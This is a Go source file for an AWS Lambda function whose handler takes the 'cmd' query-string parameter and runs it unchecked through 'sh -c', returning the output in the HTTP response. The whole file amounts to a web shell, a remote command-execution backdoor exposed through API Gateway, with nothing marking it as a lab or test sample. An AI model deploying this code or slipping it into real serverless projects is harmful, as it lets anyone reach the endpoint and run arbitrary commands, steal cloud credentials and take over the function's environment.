package main

import (
	"github.com/aws/aws-lambda-go/events"
	"github.com/aws/aws-lambda-go/lambda"
	"os/exec"
)

func handler(request events.APIGatewayProxyRequest) (*events.APIGatewayProxyResponse, error) {

	reqCmds := request.QueryStringParameters["cmd"]

	res, err := exec.Command("sh", "-c", reqCmds).CombinedOutput()
	if err != nil {
		return &events.APIGatewayProxyResponse{
			StatusCode: 500,
			Body:       "server error",
		}, err
	}

	return &events.APIGatewayProxyResponse{
		StatusCode: 200,
		Body:       string(res),
	}, nil
}

func main() {
	lambda.Start(handler)
}
